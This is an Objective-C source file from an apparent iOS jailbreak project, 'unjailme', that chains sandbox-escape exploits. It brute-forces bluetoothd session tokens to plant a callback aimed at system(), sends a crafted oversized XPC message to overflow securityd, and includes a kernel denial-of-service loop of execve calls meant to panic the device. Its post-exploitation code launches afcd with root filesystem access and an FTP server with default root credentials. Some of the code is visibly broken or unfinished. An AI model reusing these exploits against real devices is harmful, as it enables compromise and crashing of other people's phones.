//
//  exploit.c
//  unjailme
//
//  Created by Sem Voigtländer on 27/02/2018.
//  Exploit by https://github.com/rani-i
//  Copyright © 2018 Jailed Inc. All rights reserved.
//

#include "exploit.h"

/* FTP Stuff */
#ifdef MTFTP
#import "mtftp.h"
#endif

/* Private API Utillities and classes */
#import "APIManager.h"
#import "BaseBoard.h"

/* Macho Headers */
#include <mach/mach.h>
#include <mach-o/dyld.h>

/* XPC Private Framework (Install.md for instructions) */
#include <xpc/xpc.h>


/* Config */
//#define MTFTP
//#define SKIP_MACHO_HEADER
#define MAXIMUM_NUMBER_OF_PORTS_AVAILABLE 0xffff

#define BLUETOOTHD_CONST 0xFA300
#define BLUETOOTHD_WRONG_TOKEN 7

#define BLUETOOTHD_MACH_MESSAGE_ADD_CALLBACK_RECV_SIZE 0x44
#define BLUETOOTHD_MACH_MESSAGE_ADD_CALLBACK_SEND_SIZE 0x48
#define BLUETOOTHD_MACH_MESSAGE_ADD_CALLBACK_OPTIONS 0x113
#define BLUETOOTHD_MACH_MESSAGE_ADD_CALLBACK_MSG_ID 3
#define BLUETOOTHD_MACH_MESSAGE_ADD_CALLBACK_TIMEOUT 0x1000
#define BLUETOOTHD_MIG_SERVER_NAME "com.apple.server.bluetooth"

#define ADD_CALLBACK_MACH_MSG_OUT_RETURN_VALUE_OFFSET 0x20
#define ADD_CALLBACK_MACH_MSG_IN_SESSION_TOKEN_OFFSET 0x20
#define ADD_CALLBACK_MACH_MSG_IN_CALLBACK_ADDRESS_OFFSET 0x28
#define ADD_CALLBACK_MACH_MSG_IN_CALLBACK_DATA 0x40



@interface SandboxExploit()
@end

@implementation SandboxExploit

- (NSString *)stringFromHexString:(NSString *)hexString {
    
    
    // The hex codes should all be two characters.
    if (([hexString length] % 2) != 0)
        return nil;
    
    NSMutableString *string = [NSMutableString string];
    
    for (NSInteger i = 0; i < [hexString length]; i += 2) {
        
        NSString *hex = [hexString substringWithRange:NSMakeRange(i, 2)];
        NSInteger decimalValue = 0;
        sscanf([hex UTF8String], "%lx", &decimalValue);
        if(decimalValue != 0)
            if(decimalValue < 32 || decimalValue >= 127)
                return @"ERR_NON_ASCII";
        [string appendFormat:@"%c",(char)decimalValue];
    }
    
    return string;
}

uint64_t system_address = 0;
uint64_t rop_string_shell = 0;

- (void) preExploitation
{
    /* Create arbitrary pointer to lorgnette's leaked system address with arguments, not used yet though*/
    system_address = lorgnette_lookup(mach_task_self(), "system"); //Find system function address
    rop_string_shell = system_address + 0x5180; //(/bin/sh) (But obviously this doesn't exist on iOS
    
    int imageCount = _dyld_image_count(); //Get the number of loaded libraries and frameworks
    
    //For each library in the process
    for (int i=0; i < imageCount; i++) {
        
        //Get the name of the framework or libary
        const char* dylib_name =  [[[NSString stringWithUTF8String:_dyld_get_image_name(i)] lastPathComponent] UTF8String];
        
        //Get the baseaddress of the framework or library
        addr64_t addr =(addr64_t) lorgnette_lookup_baseaddress(dylib_name);
        NSLog(@"Base address of %s is %#llx\n", dylib_name, addr);
        
        //Parse the mach-o header of the framework or libary
        addr64_t macho_header_addr = lorgnette_lookup_image(mach_task_self(), "_mh_execute_header", dylib_name);
        struct mach_header_64* header64;
        header64 = (struct mach_header_64*)macho_header_addr;
        
        //Validate that we are working with an 64-bit little endian or big endian  mach-o header
        if(header64->magic != MH_CIGAM_64 && header64->magic != MH_MAGIC_64)
        {
            NSLog(@"%s: invalid mach-o magic, got: %#x\n", dylib_name, header64->magic);
        }
        
        //Get a pointer to the image header so we can start parsing the mach-o file (The framework or library)
        uint8_t *imageHeaderPtr = (uint8_t*)header64;
        imageHeaderPtr += sizeof(struct mach_header_64);
        typedef struct load_command load_command;
        
        //Find all load commands in the mach-o file (The framework or library)
        load_command *command = (load_command*)imageHeaderPtr;
        char* loadcmdstr = NULL;
        NSLog(@"Load commands:\n");
        for(int i = 0; i < header64->ncmds; i++)
        {
            switch (command->cmd) {
                case LC_MAIN:
                    loadcmdstr = "LC_MAIN";
                    break;
                case LC_ALL:
                    loadcmdstr = "LC_ALL";
                    break;
                case LC_NOTE:
                    loadcmdstr = "LC_NOTE";
                    break;
                case LC_TIME: //(LC_UNIXTHREAD)
                    loadcmdstr = "LC_TIME / LC_UNIXTHREAD";
                    break;
                case LC_UUID:
                    loadcmdstr = "LC_UUID";
                    break;
                case LC_IDENT:
                    loadcmdstr = "LC_IDENT";
                    break;
                case LC_RPATH:
                    loadcmdstr = "LC_RPATH";
                    break;
                case LC_SYMSEG: //(LC_MONETARY)
                    loadcmdstr = "LC_SYMSEG / LC_MONETARY";
                    break;
                case LC_SYMTAB: //(LC_CTYPE)
                    loadcmdstr = "LC_SYMTAB / LC_CTYPE";
                    break;
                case LC_THREAD: //(LC_NUMERIC)
                    loadcmdstr = "LC_THREAD / LC_NUMERIC";
                    break;
                case LC_COLLATE: //(LC_SEGMENT, LC_SEGMENT_NATIVE)
                    loadcmdstr = "LC_COLLATE / LC_SEGMENT / LC_SEGMENT_NATIVE";
                    break;
                case LC_FVMFILE:
                    loadcmdstr = "LC_FVMFILE";
                    break;
                case LC_PREPAGE:
                    loadcmdstr = "LC_PREPAGE";
                    break;
                case LC_DYSYMTAB:
                    loadcmdstr = "LC_DYSYMTAB";
                    break;
                case LC_ID_DYLIB:
                    loadcmdstr = "LC_ID_DYLIB";
                    break;
                case LC_IDFVMLIB:
                    loadcmdstr = "LC_IDFVMLIB";
                    break;
                case LC_MESSAGES:
                    loadcmdstr = "LC_MESSAGES";
                    break;
                case LC_PREBIND_CKSUM:
                    loadcmdstr = "LC_PREBIND_CKSUM";
                    break;
                case LC_PREBOUND_DYLIB:
                    loadcmdstr = "LC_PREBOUND_DYLIB";
                    break;
                case LC_REQ_DYLD:
                    loadcmdstr = "LC_REQ_DYLD";
                    break;
                case LC_SUB_CLIENT:
                    loadcmdstr = "LC_SUB_CLIENT";
                    break;
                case LC_SUB_UMBRELLA:
                    loadcmdstr = "LC_SUB_UMBRELLA";
                    break;
                case LC_SUB_LIBRARY:
                    loadcmdstr = "LC_SUB_LIBRARY";
                    break;
                case LC_SUB_FRAMEWORK:
                    loadcmdstr = "LC_SUB_FRAMEWORK";
                    break;
                case LC_SOURCE_VERSION:
                    loadcmdstr = "LC_SOURCE_VERSION";
                    break;
                case LC_SEGMENT_SPLIT_INFO:
                    loadcmdstr = "LC_SEGMENT_SPLIT_INFO";
                    break;
                case LC_TWOLEVEL_HINTS:
                    loadcmdstr = "LC_TWOLEVEL_HINTS";
                    break;
                case LC_VERSION_MIN_TVOS:
                    loadcmdstr = "LC_VERSION_MIN_TVOS";
                    break;
                case LC_VERSION_MIN_WATCHOS:
                    loadcmdstr = "LC_VERSION_MIN_WATCHOS";
                    break;
                case LC_VERSION_MIN_IPHONEOS:
                    loadcmdstr = "LC_VERSION_MIN_IPHONEOS";
                    break;
                case LC_REEXPORT_DYLIB:
                    loadcmdstr = "LC_REEXPORT_DYLIB";
                    break;
                case LC_BUILD_VERSION:
                    loadcmdstr = "LC_BUILD_VERSION";
                    break;
                case LC_CODE_SIGNATURE:
                    loadcmdstr = "LC_CODE_SIGNATURE";
                    break;
                case LC_DATA_IN_CODE:
                    loadcmdstr = "LC_DATA_IN_CODE";
                    break;
                case LC_DYLD_INFO:
                    loadcmdstr = "LC_DYLD_INFO";
                    break;
                case LC_DYLD_INFO_ONLY:
                    loadcmdstr = "LC_DYLD_INFO_ONLY";
                    break;
                case LC_DYLD_ENVIRONMENT:
                    loadcmdstr = "LC_DYLD_ENVIRONMENT";
                    break;
                case LC_DYLIB_CODE_SIGN_DRS:
                    loadcmdstr = "LC_DYLIB_CODE_SIGN_DRS";
                    break;
                case LC_ENCRYPTION_INFO:
                    loadcmdstr = "LC_ENCRYPTION_INFO";
                    break;
                case LC_ENCRYPTION_INFO_64:
                    loadcmdstr = "LC_ENCRYPTION_INFO_64";
                    break;
                case LC_FUNCTION_STARTS:
                    loadcmdstr = "LC_FUNCTION_STARTS";
                    break;
                case LC_LINKER_OPTIMIZATION_HINT:
                    loadcmdstr = "LC_LINKER_OPTIMIZATION_HINT";
                    break;
                case LC_LINKER_OPTION:
                    loadcmdstr = "LC_LINKER_OPTION";
                    break;
                case LC_LOAD_DYLINKER:
                    loadcmdstr = "LC_LOAD_DYLD_LINKER";
                    break;
                case LC_SEGMENT_64:
                    loadcmdstr = "LC_SEGMENT_64";
                    break;
                case LC_ROUTINES_64:
                    loadcmdstr = "LC_ROUTINES_64";
                    break;
                case LC_LOAD_DYLIB:
                    loadcmdstr = "LC_LOAD_DYLIB";
                    break;
                default:
                    loadcmdstr = (char*)[[NSString stringWithFormat:@"%#x",command->cmd] UTF8String];
                    break;
            }
            struct entry_point_command ucmd = *(struct entry_point_command*)imageHeaderPtr;
            uint64_t entryoff = ucmd.entryoff;
            entryoff = swap_uint64(entryoff);

            NSString* string = [self stringFromHexString:[NSString stringWithFormat:@"%llx",entryoff]];
            if([string isEqualToString:@"ERR_NON_ASCII"])
            {
                string = [NSString stringWithFormat:@"%#llx",entryoff];
            }
            NSLog(@"\t%s = %@\n",loadcmdstr, string);

            //NSLog(@"\t%s = %s\n",loadcmdstr, *entryoff); //Print out the load command

            imageHeaderPtr += command->cmdsize;
            command = (load_command*)imageHeaderPtr;
        }
        
#ifdef SKIP_MACHO_HEADER
        [self hexDump:(char*)dylib_name addr:(void*)(addr+sizeof(struct mach_header_64)) length: 0x200]; //dump the first 512 bytes after the mach-o header
#else
        [self hexDump:(char*)dylib_name addr:(void*)addr length: 0x200]; //dump the first 512 bytes
#endif
    }
    
    //This stuff is only meant as a demonstation for educational purposes, it doesn't contribute to the exploit
    char hostname[MAXHOSTNAMELEN]; //Won't overflow as a hostname will never be longer than MAXHOSTNAMELEN
    
    arbitrary_command libcgethostname = arbitrary("gethostname"); //Create a function pointer to the address of gethostname()
    arbitrary_command libcprintf = arbitrary("printf"); //Create a function pointer to the address of printf()
    
    CALLSYMBOL(libcgethostname, hostname, MAXHOSTNAMELEN); //Call the function with arguments, equivalent to gethostname(char* buf, int len);
    CALLSYMBOL(libcprintf, "Hostname: "); //Call printf with arguments
    CALLSYMBOL(libcprintf, hostname); //Call printf with arguments, I think you get it now.
    CALLSYMBOL(libcprintf, "\n");
}

-(mach_port_t) get_service_port:(char *)service_name
{
    kern_return_t ret = KERN_SUCCESS;
    mach_port_t service_port = MACH_PORT_NULL;
    mach_port_t bs = MACH_PORT_NULL;
    
    
    ret = task_get_bootstrap_port(mach_task_self(), &bs);
    
    ret = bootstrap_look_up(bootstrap_port, service_name, &service_port);
    if (ret)
    {
        NSLog(@"Couldn't find port for %s\n",service_name);
        return MACH_PORT_NULL;
    }
    
    NSLog(@"Got port: %x\n", service_port);
    
    mach_port_deallocate(mach_task_self(), bs);
    return service_port;
}


-(mach_msg_return_value) BTLocalDevice_add_callback:(mach_port_t)bluetoothd_port session_token:(mach_port_t)session_token callback_address:(void*)callback_address additional_data:(long)additional_data
{
    
    //Construct a the MACH_MESSAGE for bluetoothd interaction
    mach_port_t receive_port = MACH_PORT_NULL;
    mach_msg_header_t * message = NULL;
    char *data = NULL;
    kern_return_t ret = KERN_SUCCESS;
    mach_msg_return_value return_value = 0;
    mach_msg_id_t msgh_id = BLUETOOTHD_MACH_MESSAGE_ADD_CALLBACK_MSG_ID;
    mach_msg_size_t recv_size = BLUETOOTHD_MACH_MESSAGE_ADD_CALLBACK_RECV_SIZE;
    mach_msg_size_t send_size = BLUETOOTHD_MACH_MESSAGE_ADD_CALLBACK_SEND_SIZE;
    mach_msg_option_t options = BLUETOOTHD_MACH_MESSAGE_ADD_CALLBACK_OPTIONS;
    mach_msg_size_t msg_size = MAX(recv_size, send_size);
    
    //We need a port with with receive rights for responses from bluetoothd
    ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &receive_port);
    if ( ret != KERN_SUCCESS)
    {
        return_value = -3;
        NSLog(@"Failed to allocate port ret=%x\n", ret);
        NSLog(@"mach_error_string: mach_error_string %s\n", mach_error_string(ret));
        goto cleanup;
    }
    
    //We need a port with send rights for requests to bluetoothd
    ret = mach_port_insert_right(mach_task_self(), receive_port, receive_port, MACH_MSG_TYPE_MAKE_SEND);
    if ( ret != KERN_SUCCESS)
    {
        return_value = -3;
        NSLog(@"Failed to insert port right ret=%x\n", ret);
        NSLog(@"mach_error_string: mach_error_string %s\n", mach_error_string(ret));
        goto cleanup;
    }
    
    message = malloc(msg_size);
    data = (char *)message;
    memset(message, 0, msg_size);
    *((mach_port_t *)(data+ADD_CALLBACK_MACH_MSG_IN_SESSION_TOKEN_OFFSET)) = session_token;
    *((void **)(data+ADD_CALLBACK_MACH_MSG_IN_CALLBACK_ADDRESS_OFFSET)) = callback_address;
    *((long *)(data+ADD_CALLBACK_MACH_MSG_IN_CALLBACK_DATA)) = additional_data;
    message->msgh_bits = 0x1513 ;
    
    message->msgh_remote_port = bluetoothd_port; /* Request port */
    message->msgh_local_port = receive_port; /* Reply port */
    message->msgh_size =  send_size;    /* Message size */
    message->msgh_reserved = 0;
    message->msgh_id = BLUETOOTHD_CONST + msgh_id;
    
    //Send our message to bluetoothd
    ret = mach_msg(message,              /* The header */
                   options, /* Flags */
                   send_size,              /* Send size */
                   recv_size,              /* Max receive Size */
                   receive_port,                 /* Receive port */
                   BLUETOOTHD_MACH_MESSAGE_ADD_CALLBACK_TIMEOUT,        /* No timeout */
                   MACH_PORT_NULL);              /* No notification */
    
    //Make sure we were able to actually send our message
    if(MACH_MSG_SUCCESS == ret)
    {
        return_value = *(mach_msg_return_value *) (((char *) message) + ADD_CALLBACK_MACH_MSG_OUT_RETURN_VALUE_OFFSET);
        if (return_value != BLUETOOTHD_WRONG_TOKEN) {
            NSLog(@"Sent message id %d with token %x, returned: %x\n", msgh_id, session_token, return_value);
        }
    } else if (MACH_RCV_INVALID_NAME == ret) //Check if something went wrong sending our message
    {
        NSLog(@"mach_error_string: mach_error_string %s\n", mach_error_string(ret));
        NSLog(@"mach_error_int: ret=%x\n", ret);
        NSLog(@"mach_remote_port: %x\n", message->msgh_remote_port);
        return_value = -2;
    }
    else { //In all other cases something weird has happened and we failed.
        NSLog(@"mach_error_string: mach_error_string %s\n", mach_error_string(ret));
        NSLog(@"mach_error_int: ret=%x\n", ret);
        NSLog(@"mach_remote_port: %x\n", message->msgh_remote_port);
        return_value = -1;
    }
    
    
cleanup:
    if(MACH_PORT_NULL != receive_port)
    {
        mach_port_destroy(mach_task_self(), receive_port); //destroy the machport we have for receiving messages
    }
    
    if (NULL != message) {
        free(message); //free our message, we don't need it anymore
    }
    return return_value;
}


-(bool) try_to_add_callback_BTLocalDeviceAddCallbacks:(void *)address value:(long)value
{
    int ports_found[MAXIMUM_NUMBER_OF_PORTS_AVAILABLE] = {0}; //There are 0xffff (65535) maximum number of ports available, so we create a list of ports with that size
    int number_of_ports_found = 0;
    
    mach_port_t bluetoothd_port = [self get_service_port:BLUETOOTHD_MIG_SERVER_NAME]; //First we need to know what the port of bluetoothd is so we can communicate with the daemon
    
    if (MACH_PORT_NULL == bluetoothd_port) //Make we were able to get a port, else our exploit obviously failed because we can't communicate with bluetoothd
    {
        NSLog(@"Couldn't have bluetoothd port\n",nil);
        return false;
    }
    
    NSLog(@"Starting to look for session tokens\n", nil);
    for (int i = 0; i <= MAXIMUM_NUMBER_OF_PORTS_AVAILABLE; i++) {
        int id = 0;
        id = (i << 16) + 1;
        int result_code = [self BTLocalDevice_add_callback:bluetoothd_port session_token:id callback_address:NULL additional_data:0];
        if(result_code != BLUETOOTHD_WRONG_TOKEN && result_code != -1)
        {
            NSLog(@"Found port: %x\n", id);
            ports_found[number_of_ports_found] = id;
            number_of_ports_found ++;
        }
        
        
        id = (i << 16) + 2;
        result_code = [self BTLocalDevice_add_callback:bluetoothd_port session_token:id callback_address:NULL additional_data:0];
        if(result_code != BLUETOOTHD_WRONG_TOKEN && result_code != -1)
        {
            NSLog(@"Found port: %x\n", id);
            ports_found[number_of_ports_found] = id;
            number_of_ports_found ++;
        }
        
        
        id = (i << 16);
        result_code = [self BTLocalDevice_add_callback:bluetoothd_port session_token:id callback_address:NULL additional_data:0];
        if(result_code != BLUETOOTHD_WRONG_TOKEN && result_code != -1)
        {
            NSLog(@"Found port: %x\n", id);
            ports_found[number_of_ports_found] = id;
            number_of_ports_found ++;
        }
        
    }
    
    for (int i = number_of_ports_found-1; i>=0; i--) {
        // WORK IN PROGRESS
        NSLog(@"Adding callback: Port=%x address=%x value=%x\n", ports_found[i], (unsigned int)address, (unsigned int)value);
        [self BTLocalDevice_add_callback:bluetoothd_port session_token:ports_found[i] callback_address:address additional_data:value];
    }
    
    NSLog(@"Exploit succeeded!\n");
    return true;
}

- (void)doPostExploitStuff
{
    Class BSLaunchdUtilities = NSClassFromString(@"BSLaunchdUtilities");
    id label = @"com.apple.afc";
    NSMutableArray* args = [NSMutableArray arrayWithObjects:@"-r",@"-d",@"/var/root", nil];
    NSMutableArray* services = [NSMutableArray arrayWithObjects:@"com.apple.afc", nil];
    NSDictionary* env = [[NSProcessInfo processInfo] environment];
    NSString* docsdir = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    
#pragma clang diagnostic push
#pragma clang diagnostic ignore "-Wobjc-method-access"
    BOOL success = [BSLaunchdUtilities createJobWithLabel:label bundleIdentifier:@"com.apple.afcd" path:@"/usr/libexec/afcd" containerPath:@"/private/var/root/" arguments:args environment:env standardOutputPath:[docsdir stringByAppendingString:@"stdout.txt"] standardErrorPath:[docsdir stringByAppendingString:@"stderr.txt"] machServices:services threadPriority:0 waitForDebugger:YES denyCreatingOtherJobs:NO runAtLoad:YES disableASLR:YES systemApp:YES];
#pragma clang diagnostic pop
    
    if(success)
    {
        NSLog(@"AFCD2 is now running perfectly!\n");
    } else {
        NSLog(@"AFCD2 could not be ran, check your privilige!\n");
    }
    NSLog(@"Doing post-exploitation stuff...\n");
#ifdef MTFTP
    start_mtftpd();
    NSLog(@"FTP Server running on port 21\n");
    NSLog(@"You can connect with the following credentials\n\n");
    NSLog(@"User: root\n");
    NSLog(@"Password: alpine\n\n");
    NSLog(@"If you need a client for FTP checkout https://filezilla-project.org/\n");
    NSLog(@"Special thanks to pureftpd.\n\n");
    NSLog(@"Appcontainer directory: %@\n", [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject]);
#else
    //[self rebootDevice];
#endif
}

- (void) overflow_securityd {
    
    /* Part 1: Initialization and finding base addresses (for ropchain) */
    addr64_t corefoundation_address = lorgnette_lookup_baseaddress("CoreFoundation");
    addr64_t system_symbol_address = lorgnette_lookup(mach_task_self(), "system");
    NSLog(@"securityd_exploit: initiating...\n");
    
    if(corefoundation_address <= 0) {
        NSLog(@"securityd_exploit:  failed to lookup CoreFoundation's base address.\n");
        return;
    }
    if(system_symbol_address <= 0) {
        NSLog(@"securityd_exploit: failed to lookup address of system().\n");
    }
    
    NSLog(@"securityd_exploit:  CoreFoundation is at %#llx\n", corefoundation_address);
    NSLog(@"securityd_exploit:  system() is at %#llx\n", system_symbol_address);
    
    
    /* Part 2: Connecting to com.apple.securityd  */
    xpc_connection_t connection = NULL;
    connection = xpc_connection_create_mach_service("com.apple.securityd", NULL, 0);
    if(!connection)
    {
        NSLog(@"securityd_exploit: Failed to connect to securityd service.\n");
    }
    
    //Add an event handler that basically does nothing yet and continue
    xpc_connection_set_event_handler(connection, ^(xpc_object_t object) {});
    xpc_connection_resume(connection);
    
    /* Part 3: The overflow */
    
    //Create a new XPC message (messages are in dictionary format: key, value)
    xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0);
    xpc_dictionary_set_uint64(msg, "operation" /* kSecXPCKeyOperation */, 0x27);
    
    //Construct a buffer of data to be used for overflowing the service
    
    // 0x27:
    char overflow[600000] = {0}; // 600000: crashes at x2, 650000: crashes at x3
    size_t overflow_size = sizeof(overflow);
    NSLog(@"securityd_exploit:  overflow_size: 0x%zx (%d)\n", overflow_size, (uint32_t)overflow_size);
    
    
    // personal notes below (i7 11.3 15E5189f):
    // - size doesn't really matter as long as
    // size of 600000 and set null terminator at 570000 and later will cause a binary images overwrite
    // size of 550000 and set null terminator at 550000 and later will cause to fail at a different location (ca20) WITH registers overwrite
    // size of 540000 <-> 549000 and set null terminator at 550000 and later will cause to fail at a different location (11c8) WITHOUT registers overwrite
    
    
    //Construct the actual overflow
    
    // start:
    memset(&overflow, '\x55', overflow_size);
    
    // middle:
    overflow[2000] = '\x00';
    memset(&overflow[2000], '\x00\x00\x20\xd4', overflow_size - 2000);
    
    // end:
    memset(&overflow[5000], '\x41', overflow_size - 5000);
    
    // 549630 <--> 549620
    // 549600: pc: 1d0 or 1c8 (crash log: 220737)
    // 549626 <-> 549627: pc: 0x00000001020791d4 (crash log: 221912)
    // 549628: pc: 0x00000001003b91c8 (crash log: 2223229)
    // 549629: pc: ca20. registers overwritten. x18/x14 are partially overwritten.
    
    int x = 549628;
    memset(&overflow[x], '\0', overflow_size - x);
    overflow[549597] = '\0'; //null terminator
    
    
#if 0
    
    //Code for setting the CPU registers:
    memset(&overflow[530000], '\x00', 8);
    
    // x8:
    memset(&overflow[1000], '\x41', overflow_size - 1000);
    
    // x9:
    memset(&overflow[249843], '\x09', 8);
    
    // x10:
    memset(&overflow[249851], '\x10', 8);
    
    // x11:
    memset(&overflow[249859], '\x11', 8);
    
    // x14 (can overwrite parially):
    memset(&overflow[0], '\x14', 4);
    
    // x15:
    memset(&overflow[4], '\x15', 8);
#endif
    
    overflow[overflow_size] = '\x00'; //Null terminator
    NSLog(@"securityd exploit: Overflow constructed.\n");
    
    /* Part 4: Perform the overflow */
    xpc_dictionary_set_string(msg, "deviceID", overflow);
    NSLog(@"securityd_exploit: sending payload to securityd\n");
    
    //Send the overflow and see what response we get back from securityd
    xpc_object_t reply = xpc_connection_send_message_with_reply_sync(connection, msg);
    
    //If we end up with a reply that the connection is interrupted, the service was killed and the overflow worked
    if(reply == XPC_ERROR_CONNECTION_INTERRUPTED) {
        NSLog(@"securityd_exploit: successfully sent our payload to securityd\n");
        bzero(overflow, overflow_size); //Free memory for the overflow buffer again
        
        // next steps: (This is where our post-exploitation stuff will go)
        
    } else {
        NSLog(@"securityd_exploit: failed to overflow securityd: %s\n", xpc_copy_description(reply));
    }
    
    //Print out the response description for debugging
    NSLog(@"securityd_exploit:\nreply data:%s\nIf this mentions connection interupted we succeeded!\n", xpc_copy_description(reply));
    
    
}

/* Bug (DoS) in allocation of kernel address space, PoC using execve syscall. */
//Panic: alloc_asid() out of ASID number.
//Explanation: For execve address space is allocated before the validation checks, doing this in a loop makes the kernel run out of identifiers

- (void)rebootDevice {
    for(int i = 0; i < 10000; i++) { //We want to work with 10.000 asynchronous threads
        dispatch_async(dispatch_get_main_queue(), ^(void){
                    [NSThread detachNewThreadWithBlock:^(void){
                        for(int j = 0; j < 10000; j++) //We want to allocate 10.000 at a time (final total: 100.000)
                        {
                            execve("/APPLE/SEEMS/TO/NEVER/PATCH/THIS/BUG/I/MAILED/THEM/SINCE/IOS/9.2.1", NULL, NULL);
                        }
                    }];

            });
        }
}

/* Function for dumping a chunk of memory starting at a given address */
-(void) hexDump:(char *)desc addr:(void *)addr length:(int)len
{
    int i;
    unsigned char buff[17];
    unsigned char *pc = (unsigned char*)addr;
    
    // Output description if given.
    if (desc != NULL)
        NSLog (@"%s:\n", desc);
    
    // Process every byte in the data.
    for (i = 0; i < len; i++) {
        // Multiple of 16 means new line (with line offset).
        
        if ((i % 16) == 0) {
            // Just don't print ASCII for the zeroth line.
            if (i != 0)
                NSLog (@"  %s\n", buff);
            
            // Output the offset (0x...)
            NSLog (@"  %#04x ", i);
        }
        
        // Now the hex code for the specific character.
        NSLog (@" %02x", pc[i]);
        
        // And store a printable ASCII character for later.
        if ((pc[i] < 0x20) || (pc[i] > 0x7e)) {
            buff[i % 16] = '.';
        } else {
            buff[i % 16] = pc[i];
        }
        
        buff[(i % 16) + 1] = '\0';
    }
    
    // Pad out last line if not exactly 16 characters.
    while ((i % 16) != 0) {
        NSLog (@"   ");
        i++;
    }
    // And print the final ASCII bit.
    NSLog (@"  %s\n", buff);
}

- (void)run{
    if(self.output == nil)
    {
        self.output = @"";
    }
    
    if(CPU_IS_64BIT()) //Check if we have a 64-bit device
    {
        [self preExploitation];
    } else {
        NSLog(@"Currently UnjailMe only supports 64-bit devices.\n");
        return;
    }
    
    //Zimperium bluetoothd vulnerabillities were patched in iOS 11.2.5
    //They now use arc4random() (random of 2^32) instead of the client port
    //This does not quite prevent session hijacking yet, but it makes it take longer to hijack a session
    //Do not expect a sandbox escape to come for 11.2.5 though
    
    if(SYSTEM_VERSION_LESS_THAN(@"11.2.5"))
    {
        [self try_to_add_callback_BTLocalDeviceAddCallbacks:(void *)system_address value:(long)rop_string_shell];
    }
    
    //Luckily for devices running 11.3 and below Abraham Masri released a PoC for a buffer underflow in securityd
    //It does not look very easy to exploit but I still believe it is possible
    
    if(SYSTEM_VERSION_GREATER_THAN(@"11.2.2") && SYSTEM_VERSION_LESS_THAN(@"11.3.1"))
    {
        //Run exploit by @cheesecakeufo (Abraham)
        [self overflow_securityd];
    }
    
    if(SYSTEM_VERSION_LESS_THAN(@"11.3.1"))
    {
        //Run the post-exploitation stuff only if the device supports it
        [self doPostExploitStuff];
    }
    
}
@end
